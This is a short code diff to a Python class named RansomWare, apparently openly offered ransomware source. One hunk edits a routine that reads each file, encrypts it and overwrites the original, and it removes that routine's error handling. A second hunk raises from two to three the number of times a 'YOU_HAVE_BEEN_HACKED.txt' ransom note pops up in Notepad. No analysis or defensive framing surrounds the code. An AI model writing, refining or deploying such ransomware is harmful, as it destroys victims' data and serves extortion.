@@ -91,13 +91,10 @@ class RansomWare:
     def crypt_file(self, file_path, encrypted=False):
         with open(file_path, 'rb') as f:
             data = f.read()
-            try:
-                if not encrypted:
-                    _data = self.crypter.encrypt(data)
-                else:
-                    _data = self.crypter.decrypt(data)
-            except Exception as error:
-                print(error)
+            if not encrypted:
+                _data = self.crypter.encrypt(data)
+            else:
+                _data = self.crypter.decrypt(data)
         with open(file_path, 'wb') as fp:
             fp.write(_data)
 
@@ -169,7 +166,7 @@ HEED THIS WARNING:
                 ransom = subprocess.Popen(['notepad.exe', 'YOU_HAVE_BEEN_HACKED.txt'])
             time.sleep(30)
             count +=1 
-            if count == 2:
+            if count == 3:
                 break
 
     def put_me_on_desktop(self):
